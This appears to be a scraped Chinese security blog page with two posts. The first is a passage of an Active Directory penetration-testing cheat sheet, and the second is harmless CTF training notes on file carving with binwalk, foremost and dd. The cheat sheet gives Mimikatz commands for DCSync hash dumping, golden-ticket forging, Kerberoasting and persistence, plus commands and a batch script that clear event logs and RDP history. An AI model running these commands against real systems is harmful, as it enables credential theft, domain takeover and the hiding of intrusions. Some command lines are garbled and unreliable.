<h5 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a>SPN扫描</h5><p>Kerberoast可以作为一个有效的方法从Active Directory中以普通用户的身份提取服务帐户凭据，无需向目标系统发送任何数据包。<br>SPN是服务在使用Kerberos身份验证的网络上的唯一标识符。它由服务类，主机名和端口组成。在使用Kerberos身份验证的网络中，必须在内置计算机帐户（如NetworkService或LocalSystem）或用户帐户下为服务器注册SPN。对于内部帐户，SPN将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户的手动注册SPN。<br>SPN扫描的主要好处是，SPN扫描不需要连接到网络上的每个IP来检查服务端口，SPN通过LDAP查询向域控执行服务发现，SPN查询是Kerberos的票据行为一部分，因此比较难检测SPN扫描。<br>相关阅读 :</p>
<ul>
<li><a href="https://blog.netspi.com/locate-and-attack-domain-sql-servers-without-scanning/" target="_blank" rel="noopener">非扫描式的SQL Server发现</a> </li>
<li><a href="https://adsecurity.org/?p=1508" target="_blank" rel="noopener">SPN扫描</a> </li>
<li><a href="https://github.com/PyroTek3/PowerShell-AD-Recon" target="_blank" rel="noopener">扫描SQLServer的脚本</a> </li>
</ul>
<h5 id="Kerberos的黄金门票"><a href="#Kerberos的黄金门票" class="headerlink" title="Kerberos的黄金门票"></a>Kerberos的黄金门票</h5><p>在域上抓取的哈希</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:pentest.com &#x2F;user:krbtgt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">kerberos::golden &#x2F;admin:administrator &#x2F;domain:域 &#x2F;sid:SID &#x2F;krbtgt:hash值 &#x2F;ticket:adinistrator.kiribi</span><br><span class="line">kerberos::ptt administrator.kiribi</span><br><span class="line">kerberos::tgt</span><br><span class="line">net use k: \pnet use k: \pentest.comc$</span><br></pre></td></tr></table></figure>
<p>相关阅读 :</p>
<ul>
<li><a href="https://adsecurity.org/?p=1640" target="_blank" rel="noopener">https://adsecurity.org/?p=1640</a> </li>
<li><a href="http://bobao.360.cn/learning/detail/3564.html" target="_blank" rel="noopener">域服务账号破解实践</a> </li>
<li><a href="https://blog.csdn.net/wulantian/article/details/42418231" target="_blank" rel="noopener">Kerberos的认证原理</a> </li>
<li><a href="https://klionsec.github.io/2016/08/10/ntlm-kerberos/" target="_blank" rel="noopener">深刻理解windows安全认证机制ntlm＆Kerberos</a> </li>
</ul>
<h5 id="Kerberos的银票务"><a href="#Kerberos的银票务" class="headerlink" title="Kerberos的银票务"></a>Kerberos的银票务</h5><p>黄金票据和白银票据的一些区别：<br>Golden Ticket：伪造<code>TGT</code>，可以获取<code>任何Kerberos</code>服务权限<br>银票：伪造TGS，<code>只能访问指定的服务</code><br>加密方式不同：<br>Golden Ticket由<code>krbtgt</code>的hash加密<br>Silver Ticket由<code>服务账号</code>（通常为计算机账户）Hash加密<br>认证流程不同：<br>金票在使用的过程需要同域控通信<br>银票在使用的过程不需要同域控通信<br>相关阅读 :</p>
<ul>
<li><a href="https://adsecurity.org/?p=2011" target="_blank" rel="noopener">攻击者如何使用Kerberos的银票来利用系统</a> </li>
<li><a href="https://www.feiworks.com/wy/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.pdf" target="_blank" rel="noopener">域渗透——Pass The Ticket</a></li>
</ul>
<h5 id="域服务账号破解"><a href="#域服务账号破解" class="headerlink" title="域服务账号破解"></a>域服务账号破解</h5><p>与上面SPN扫描类似的原理<br><a href="https://github.com/nidem/kerberoast" target="_blank" rel="noopener">https://github.com/nidem/kerberoast</a><br>获取所有用作SPN的帐户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T PENTEST.com -Q *&#x2F;*</span><br></pre></td></tr></table></figure>
<p>从Mimikatz的RAM中提取获得的门票</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list &#x2F;export</span><br></pre></td></tr></table></figure>
<p>用rgsrepcrack破解</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi</span><br></pre></td></tr></table></figure>
<h5 id="凭证盗窃"><a href="#凭证盗窃" class="headerlink" title="凭证盗窃"></a>凭证盗窃</h5><p>从搜集的密码里面找管理员的密码 </p>
<h5 id="地址解析协议"><a href="#地址解析协议" class="headerlink" title="地址解析协议"></a>地址解析协议</h5><p>实在搞不定再搞ARP<br>​    </p>
<h4 id="获取AD哈希"><a href="#获取AD哈希" class="headerlink" title="获取AD哈希"></a>获取AD哈希</h4><ul>
<li>使用VSS卷影副本 </li>
<li>Ntdsutil中获取NTDS.DIT​​文件 </li>
<li>PowerShell中提取NTDS.DIT –&gt;<a href="https://github.com/clymb3r/PowerShell/tree/master/Invoke-NinjaCopy" target="_blank" rel="noopener">Invoke-NinaCopy </a></li>
<li>使用Mimikatz提取 </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz lsadump::lsa &#x2F;inject exit</span><br></pre></td></tr></table></figure>
<ul>
<li>使用PowerShell Mimikatz</li>
<li>使用Mimikatz的DCSync 远程转储Active Directory凭证<br>提取 KRBTGT用户帐户的密码数据：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mimikatz &quot;privilege::debug&quot; &quot;lsadump::dcsync &#x2F;domain:rd.adsecurity.org &#x2F;user：krbtgt&quot;exit</span><br></pre></td></tr></table></figure>
<p>管理员用户帐户提取密码数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mimikatz &quot;privilege::debug&quot; &quot;lsadump::dcsync &#x2F;domain:rd.adsecurity.org &#x2F;user：Administrator&quot; exit</span><br></pre></td></tr></table></figure>
<ul>
<li>NTDS.dit中提取哈希<br>使用esedbexport恢复以后使用ntdsxtract提取 </li>
</ul>
<h4 id="AD持久化"><a href="#AD持久化" class="headerlink" title="AD持久化"></a>AD持久化</h4><h5 id="活动目录持久性技巧"><a href="#活动目录持久性技巧" class="headerlink" title="活动目录持久性技巧"></a>活动目录持久性技巧</h5><p><a href="https://adsecurity.org/?p=1929" target="_blank" rel="noopener">https://adsecurity.org/?p=1929</a><br>DS恢复模式密码维护<br>DSRM密码同步 </p>
<blockquote>
<p>Windows Server 2008 需要安装KB961320补丁才支持DSRM密码同步，Windows Server 2003不支持DSRM密码同步。KB961320:<a href="https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,可参考：[巧用DSRM密码同步将域控权限持久化](http://drops.xmd5.com/static/drops/tips-9297.html)" target="_blank" rel="noopener">https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,可参考：[巧用DSRM密码同步将域控权限持久化](http://drops.xmd5.com/static/drops/tips-9297.html)</a></p>
</blockquote>
<p><a href="https://www.dcshadow.com/" target="_blank" rel="noopener">DCshadow </a></p>
<h5 id="Security-Support-Provider"><a href="#Security-Support-Provider" class="headerlink" title="Security Support Provider"></a>Security Support Provider</h5><p>简单的理解为SSP就是一个DLL，用来实现身份认证</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure>
<p>这样就不需要重启<code>c:/windows/system32</code>可看到新生成的文件kiwissp.log</p>
<h5 id="SID-History"><a href="#SID-History" class="headerlink" title="SID History"></a><a href="https://adsecurity.org/?p=1772" target="_blank" rel="noopener">SID History</a></h5><p>SID历史记录允许另一个帐户的访问被有效地克隆到另一个帐户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;misc::addsid bobafett ADSAdministrator&quot;</span><br></pre></td></tr></table></figure>
<h5 id="AdminSDHolder＆SDProp"><a href="#AdminSDHolder＆SDProp" class="headerlink" title="AdminSDHolder＆SDProp "></a><a href="https://adsecurity.org/?p=1906" target="_blank" rel="noopener">AdminSDHolder＆SDProp </a></h5><p>利用AdminSDHolder＆SDProp（重新）获取域管理权限 </p>
<h5 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h5><p><a href="https://adsecurity.org/?p=2716" target="_blank" rel="noopener">https://adsecurity.org/?p=2716</a><br><a href="https://www.anquanke.com/post/id/86531" target="_blank" rel="noopener">策略对象在持久化及横向渗透中的应用</a> </p>
<h5 id="Hook-PasswordChangeNotify"><a href="#Hook-PasswordChangeNotify" class="headerlink" title="Hook PasswordChangeNotify"></a>Hook PasswordChangeNotify</h5><p><a href="http://wooyun.jozxing.cc/static/drops/tips-13079.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/drops/tips-13079.html</a> </p>
<h4 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h4><p><a href="https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed" target="_blank" rel="noopener">《域渗透——Dump Clear-Text Password after KB2871997 installed》</a><br><a href="http://www.vuln.cn/6812" target="_blank" rel="noopener">《域渗透——Hook PasswordChangeNotify》</a> </p>
<blockquote>
<p>可通过Hook PasswordChangeNotify实时记录域控管理员的新密码 </p>
</blockquote>
<p><a href="http://www.liuhaihua.cn/archives/179102.html" target="_blank" rel="noopener">《域渗透——Local Administrator Password Solution》 </a></p>
<blockquote>
<p>域渗透时要记得留意域内主机的本地管理员账号 </p>
</blockquote>
<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/" target="_blank" rel="noopener">《域渗透——利用SYSVOL还原组策略中保存的密码》 </a></p>
<h4 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h4><p><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">BloodHound </a><br><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">CrackMapExec </a><br><a href="https://github.com/byt3bl33d3r/DeathStar" target="_blank" rel="noopener">DeathStar</a> </p>
<blockquote>
<p>利用过程：<a href="http://www.freebuf.com/sectool/160884.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/160884.html</a> </p>
</blockquote>
<h3 id="在远程系统上执行程序"><a href="#在远程系统上执行程序" class="headerlink" title="在远程系统上执行程序"></a>在远程系统上执行程序</h3><ul>
<li>At </li>
<li>Psexec </li>
<li>WMIC </li>
<li>Wmiexec </li>
<li>Smbexec </li>
<li>Powershell remoting </li>
<li>DCOM </li>
</ul>
<h3 id="IOT相关"><a href="#IOT相关" class="headerlink" title="IOT相关"></a>IOT相关</h3><ul>
<li>1、路由器 <a href="https://github.com/reverse-shell/routersploit" target="_blank" rel="noopener">routersploit </a></li>
<li>2、打印机 <a href="https://github.com/RUB-NDS/PRET" target="_blank" rel="noopener">PRET </a></li>
<li>3、IOT exp <a href="https://www.exploitee.rs/" target="_blank" rel="noopener">https://www.exploitee.rs/</a></li>
<li>4、相关<br><a href="https://www.owasp.org/index.php/OWASP_Nettacker" target="_blank" rel="noopener">OWASP-Nettacker</a><br><a href="https://github.com/dark-lbp/isf" target="_blank" rel="noopener">isf</a><br><a href="https://github.com/w3h/icsmaster" target="_blank" rel="noopener">icsmaster</a></li>
</ul>
<h3 id="中间人"><a href="#中间人" class="headerlink" title="中间人"></a>中间人</h3><ul>
<li><a href="http://www.oxid.it/cain.html" target="_blank" rel="noopener">Cain</a> </li>
<li><a href="https://github.com/Ettercap/ettercap" target="_blank" rel="noopener">Ettercap</a> </li>
<li><a href="https://github.com/SpiderLabs/Responder" target="_blank" rel="noopener">Responder</a> </li>
<li><a href="https://github.com/byt3bl33d3r/MITMf" target="_blank" rel="noopener">MITMf</a> </li>
<li><a href="https://github.com/evilsocket/bettercap" target="_blank" rel="noopener">3r/MITMf)</a> </li>
</ul>
<h3 id="规避杀软及检测"><a href="#规避杀软及检测" class="headerlink" title="规避杀软及检测"></a>规避杀软及检测</h3><h4 id="Bypass-Applocker"><a href="#Bypass-Applocker" class="headerlink" title="Bypass Applocker"></a>Bypass Applocker</h4><p><a href="https://github.com/api0cradle/UltimateAppLockerByPassList" target="_blank" rel="noopener">UltimateAppLockerByPassList </a><br><a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">https://lolbas-project.github.io/</a> </p>
<h4 id="bypassAV"><a href="#bypassAV" class="headerlink" title="bypassAV"></a>bypassAV</h4><ul>
<li>Empire </li>
<li>PEspin </li>
<li>Shellter </li>
<li>Ebowla </li>
<li>Veil </li>
<li>PowerShell </li>
<li>Python </li>
<li><a href="http://www.4hou.com/technology/9379.html" target="_blank" rel="noopener">代码注入技术Process Doppelgänging </a></li>
<li>…</li>
</ul>
<h2 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h2><h3 id="Windows日志清除"><a href="#Windows日志清除" class="headerlink" title="Windows日志清除"></a><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87/" target="_blank" rel="noopener">Windows日志清除</a></h3><p>获取日志分类列表：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil el &gt;1.txt</span><br></pre></td></tr></table></figure>
<p>获取单个日志类别的统计信息：<br>eg.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil gli &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure>
<p>回显：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">creationTime: 2016-11-28T06:01:37.986Z</span><br><span class="line">lastAccessTime: 2016-11-28T06:01:37.986Z</span><br><span class="line">lastWriteTime: 2017-08-08T08:01:20.979Z</span><br><span class="line">fileSize: 1118208</span><br><span class="line">attributes: 32</span><br><span class="line">numberOfLogRecords: 1228</span><br><span class="line">oldestRecordNumber: 1</span><br></pre></td></tr></table></figure>
<p>查看指定日志的具体内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe &#x2F;f:text &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure>
<p>删除单个日志类别的所有信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil cl &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure>
<h3 id="破坏Windows日志记录功能"><a href="#破坏Windows日志记录功能" class="headerlink" title="破坏Windows日志记录功能"></a>破坏Windows日志记录功能</h3><p>利用工具 </p>
<ul>
<li><a href="https://github.com/hlldz/Invoke-Phant0m" target="_blank" rel="noopener">Invoke-Phant0m</a> </li>
<li><a href="https://github.com/3gstudent/Windwos-EventLog-Bypass" target="_blank" rel="noopener">Windwos-EventLog-Bypass</a> </li>
</ul>
<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run clearlogs</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearev</span><br></pre></td></tr></table></figure>
<h3 id="3389登陆记录清除"><a href="#3389登陆记录清除" class="headerlink" title="3389登陆记录清除"></a>3389登陆记录清除</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">@reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; &#x2F;va &#x2F;f</span><br><span class="line">@del &quot;%USERPROFILE%\My Documents\Default.rdp&quot; &#x2F;a</span><br><span class="line">@exit</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-CTF赛前培训____杂项" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/07/25/CTF%E8%B5%9B%E5%89%8D%E5%9F%B9%E8%AE%AD____%E6%9D%82%E9%A1%B9/" class="article-date">
  	<time datetime="2020-07-25T01:17:19.098Z" itemprop="datePublished">2020-07-25</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/07/25/CTF%E8%B5%9B%E5%89%8D%E5%9F%B9%E8%AE%AD____%E6%9D%82%E9%A1%B9/">
        CTF赛前培训____杂项
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="信息安全"><a href="#信息安全" class="headerlink" title="信息安全"></a>信息安全</h4><p>信息安全介绍</p>
<p><img src="/2020/07/25/CTF%E8%B5%9B%E5%89%8D%E5%9F%B9%E8%AE%AD____%E6%9D%82%E9%A1%B9/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200529075332068.png" alt="image-20200529075332068"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200529182253678.png" alt="image-20200529182253678"></p>
<h5 id="CTF的目标是什么"><a href="#CTF的目标是什么" class="headerlink" title="CTF的目标是什么"></a>CTF的目标是什么</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200529182740768.png" alt="image-20200529182740768"></p>
<h5 id="CTF比赛形式"><a href="#CTF比赛形式" class="headerlink" title="CTF比赛形式"></a>CTF比赛形式</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200529183542305.png" alt="image-20200529183542305"></p>
<h5 id="CTF解题模式的题目类型"><a href="#CTF解题模式的题目类型" class="headerlink" title="CTF解题模式的题目类型"></a>CTF解题模式的题目类型</h5><p><strong>1、web安全</strong>：通过浏览器访问你题目服务器上的王炸你，寻找网站漏洞（sql注入，xss文件上传，包含漏洞，xxe，ssrf，命令执行，代码审计等），利用网站漏洞获得服务器的部分或全部权限，拿到flag，通常包含分值最大的web渗透题；</p>
<p><strong>2、逆向工程（Reverse）</strong>：题目就是一个软件，但通常没有软件的源代码；需要利用工具对软件进行反编译甚至反汇编，从而理解软件内部逻辑和原理，找出flag计算相关的算法并破解这个算法，获取flag</p>
<p><strong>3、漏洞挖掘与漏洞利用（PWN,EXPLOIT）</strong>：访问一个本地或远程的二进制服务程序，通过逆向工程找出程序存在的漏洞，并利用程序中的漏洞获取远程服务器的部分或全部权限，拿到flag；</p>
<p><strong>4、密码学（Crypto）</strong>：分析提米中的密码算法与协议，利用算法或协议的弱点来计算秘钥或对密文进行解密，从而获取flag。</p>
<p>对密码方式进行解码，比如：base64，或者一些加密算法。</p>
<p>加密算法：凯撒密码等等</p>
<p>摘要算法：MD5、SHA1等等，合起来就是密码学</p>
<p><strong>5、调查取证（Misc）</strong>：也可以称为<strong>杂项</strong>。。。利用隐写术等保护技术将信息隐藏在图像、音频、视频、压缩包中，或者信息就在一段内存镜像或网络流量中，尝试将隐藏的信息恢复出来即可获得flag</p>
<p><strong>6、移动安全（Mobile）</strong>：对安卓和IOS系统的理解，逆向工程等知识。</p>
<p>难度排序从上往下：</p>
<p>①   杂项（Misc）</p>
<p>②   密码学（Crypto）</p>
<p>③   web安全</p>
<p>④   逆向（Reverse）</p>
<p>⑤   二进制破解（PWN）</p>
<p>第一个难度最低。</p>
<h5 id="CTF攻防模式"><a href="#CTF攻防模式" class="headerlink" title="CTF攻防模式"></a>CTF攻防模式</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200529202426037.png" alt="image-20200529202426037"></p>
<h5 id="CTF备战思路"><a href="#CTF备战思路" class="headerlink" title="CTF备战思路"></a>CTF备战思路</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200530081831066.png" alt="image-20200530081831066"></p>
<h5 id="CTF真题演练场"><a href="#CTF真题演练场" class="headerlink" title="CTF真题演练场"></a>CTF真题演练场</h5><p>hackingLab实验室：<a href="http://hackinglab.cn" target="_blank" rel="noopener">http://hackinglab.cn</a></p>
<p>实验吧：<a href="http://www.shiyanbar.com/ctf/practice" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/practice</a></p>
<p>i春秋CTF大本营：<a href="https://www.ichunqiu.com/competition" target="_blank" rel="noopener">https://www.ichunqiu.com/competition</a></p>
<p>合天实验室：<a href="http://www.hetianlab.com" target="_blank" rel="noopener">www.hetianlab.com</a></p>
<p>UssLab Jarvis OJ Platform：<a href="https://www.jarvisoj.com" target="_blank" rel="noopener">https://www.jarvisoj.com</a></p>
<p>XCTF实训平台：<a href="http://oj.xctf.org.cn" target="_blank" rel="noopener">http://oj.xctf.org.cn</a></p>
<p>Capture the Flag：<a href="http://captf.com" target="_blank" rel="noopener">http://captf.com</a></p>
<p>CTF Time：<a href="https://ctftime.org" target="_blank" rel="noopener">https://ctftime.org</a></p>
<p>BugkuCTF：<a href="http://ctf.bugku.com/login" target="_blank" rel="noopener">http://ctf.bugku.com/login</a></p>
<h5 id="Hackgame"><a href="#Hackgame" class="headerlink" title="Hackgame"></a>Hackgame</h5><p>SQL注入练习：<a href="http://redtiger.labs.overthewire.org" target="_blank" rel="noopener">http://redtiger.labs.overthewire.org</a></p>
<p>Xss game：<a href="http://prompt.ml/0" target="_blank" rel="noopener">http://prompt.ml/0</a></p>
<p>XSS challenges：<a href="http://xss-quiz.int21h.jp" target="_blank" rel="noopener">http://xss-quiz.int21h.jp</a></p>
<p>红客闯关游戏：<a href="http://hkyx.myhack58.com" target="_blank" rel="noopener">http://hkyx.myhack58.com</a></p>
<p>梦之光芒Hack游戏：<a href="http://monyer.com/game" target="_blank" rel="noopener">http://monyer.com/game</a></p>
<h5 id="CTF-Writeup"><a href="#CTF-Writeup" class="headerlink" title="CTF-Writeup"></a>CTF-Writeup</h5><p>实验吧Writeup：<a href="http://hebin.me" target="_blank" rel="noopener">http://hebin.me</a></p>
<p>360播报：<a href="http://bobao.360.cn/ctf" target="_blank" rel="noopener">http://bobao.360.cn/ctf</a></p>
<p>安全脉搏：<a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup" target="_blank" rel="noopener">https://www.secpulse.com/archives/category/exclusive/ctf-writeup</a></p>
<p>github上的writeup：</p>
<p><a href="https://github.com/ctfs" target="_blank" rel="noopener">https://github.com/ctfs</a></p>
<p><a href="https://github.com/VulnHub/ctf-writeups" target="_blank" rel="noopener">https://github.com/VulnHub/ctf-writeups</a></p>
<h4 id="文件操作与隐写"><a href="#文件操作与隐写" class="headerlink" title="文件操作与隐写"></a>文件操作与隐写</h4><h5 id="文件类型识别"><a href="#文件类型识别" class="headerlink" title="文件类型识别"></a>文件类型识别</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200530174356083.png" alt="image-20200530174356083"></p>
<h5 id="常见的文件头类型"><a href="#常见的文件头类型" class="headerlink" title="常见的文件头类型"></a>常见的文件头类型</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200530200204759.png" alt="image-20200530200204759"></p>
<p>每个文件类型的文件头是不同的。</p>
<p>可以使用文本软件来查看16进制，看看是否与文件头对应</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200530202142688.png" alt="image-20200530202142688"></p>
<h5 id="文件头残缺-错误"><a href="#文件头残缺-错误" class="headerlink" title="文件头残缺/错误"></a>文件头残缺/错误</h5><p>​        通常文件无法正常打开有两种情况，一种是文件头部残缺，另一种是文件头部字段错误。winhex程序添加相应的文件头，针对头部字段错误，可以找一个相同类型的文件进行替换。</p>
<p>格式：file 文件名</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200530203703413.png" alt="image-20200530203703413"></p>
<p>如果文件头确实或者错误，我们就要进行修复</p>
<p>当文件查看不了的时候显示这是一个data文件，告诉你这就是一串数据，它也不知道这是什么类型的文件，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200530204639638.png" alt="image-20200530204639638"></p>
<p>如果缺失了，可以用notpad++进行修改16进制，将正确的文件头输入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200530210037447.png" alt="image-20200530210037447"></p>
<h5 id="文件分离操作"><a href="#文件分离操作" class="headerlink" title="文件分离操作"></a>文件分离操作</h5><h5 id="1、Binwalk"><a href="#1、Binwalk" class="headerlink" title="1、Binwalk"></a>1、Binwalk</h5><p>​    Binwalk是linux下用来分析和分离文件的工具，可以快速分辨文件是否由多个文件合并而成，并将文件进行分离，如果分离成功会在目标文件的目录</p>
<p>同目录下生成一个形如_ 文件名 _extracted的文件目录，目录中有分离后的文件</p>
<p>用法：</p>
<p>分析文件：<code>binwalk filename</code></p>
<p>分离文件：<code>binwalk -e filename</code></p>
<p>binwalk是linux下的一款工具。当你拿到一个文件的时候如果图片中没有任何隐藏文件那就会返回文件格式如果文件中隐藏了文件，使用binwalk的时候就会返回隐藏的文件</p>
<p>这个图片是里面没有任何隐藏的文件所以只返回了文件格式</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531090736137.png" alt="image-20200531090736137"></p>
<p>如果是图片中隐藏了内容的话，会分析出其中的内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531090846805.png" alt="image-20200531090846805"></p>
<p>可以看到第二行的 0x596F后面是ZIP所以需要使用<code>binwalk -e 文件名</code>   来讲文件中的内容分离出来，可以看到这样就多出来一个文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531091238559.png" alt="image-20200531091238559"></p>
<p>打开文件原图片的文件可以看到多了一个文件夹</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531091335384.png" alt="image-20200531091335384"></p>
<p>打开这个文件夹发现里面还有一个压缩包和一个key.txt的文件，这个key.txt就是压缩包中的 文件，因为binwalk会自动将压缩包进行解压</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531091544496.png" alt="image-20200531091544496"></p>
<h5 id="2、foremost"><a href="#2、foremost" class="headerlink" title="2、foremost"></a>2、foremost</h5><p>还有一种就是，比如binwalk不能使用了，无法进行分离，</p>
<p>可以使用<code>foremost 文件名 -o 自定义文件名</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531094100756.png" alt="image-20200531094100756"></p>
<p>foremost并不能像binwalk一样进行压缩包解压，他会详细的将文件分类，jpg就在jpg文件夹中，压缩包就在zip文件夹中，而且还会生成一个日志</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531094114315.png" alt="image-20200531094114315"></p>
<p>要获取flag文件就要自行将zip进行解压。获取key值</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531094816974.png" alt="image-20200531094816974"></p>
<h5 id="3、dd"><a href="#3、dd" class="headerlink" title="3、dd"></a>3、dd</h5><p>​    当文件自动分离出错或者因为其他原因无法自动分离时，可以使用dd实现文件手动分离。</p>
<p>格式：</p>
<p><code>dd if=源文件 of=目标文件名 bs=1 skip= 开始分离的字节数</code></p>
<p>参数说明：</p>
<p><code>if=file            #输入文件名，缺省为标准输入</code></p>
<p><code>of=file         #输出文件名，缺省为标准输出。</code></p>
<p><code>bs=bytes        #同时设置读写块的大小为bytes，可代替ibs和obs。</code></p>
<p><code>skip=blocks    #从输入文件开头跳过blocks个块后再开始复制</code></p>
<p>小例子：</p>
<p>这里的<code>bs=5</code>和<code>count=1</code>的意思就是将前面5个数保存到2.txt，剩下的去掉</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531100643431.png" alt="image-20200531100643431"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531102208822.png" alt="image-20200531102208822"></p>
<p>skip的意思就是跳过多少块，因为设置的bs是5也就是前5个数，然后skip跳过第一块，就将1-5跳过了。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531102310903.png" alt="image-20200531102310903"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531105530101.png" alt="image-20200531105530101"></p>
